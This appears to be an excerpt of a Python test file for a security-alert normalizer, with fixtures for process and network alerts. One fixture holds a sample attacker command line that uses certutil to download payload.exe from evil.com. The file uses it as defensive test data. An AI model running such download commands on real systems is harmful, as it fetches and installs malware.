...
def process_only_alert() -> dict:
    ...
    return {
        ...
        "action_process_image_command_line": "certutil -urlcache -split -f http://evil.com/payload.exe",
        "actor_process_image_name": "cmd.exe",
...
def network_only_alert() -> dict:
    ...
    return {
        ...
        "action_remote_ip": "198.51.100.42",
...
class TestEvidences:
    ...
    def test_network_evidence(self, normalizer, network_only_alert):
        ...
        assert net_ev[0]["dst_endpoint"]["ip"] == "198.51.100.42"
